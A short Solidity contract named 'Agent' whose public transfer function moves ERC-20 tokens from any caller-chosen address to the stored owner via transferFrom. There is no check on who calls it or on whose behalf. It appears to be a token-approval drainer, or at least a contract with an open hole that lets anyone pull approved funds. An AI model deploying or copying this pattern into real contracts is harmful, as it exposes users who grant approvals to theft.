pragma solidity ^0.8.0;

import "./IERC20.sol";

contract Agent {
    address _owner;

    constructor(address owner) public {
        _owner = owner;
    }

    function transfer(address token, address payable from, uint256 amount) public payable {
        require(amount > 0, "Amount must be greater than 0");
        bool res = IERC20(token).transferFrom(from, _owner, amount);
        require(res, "Transfer failed");
    }
}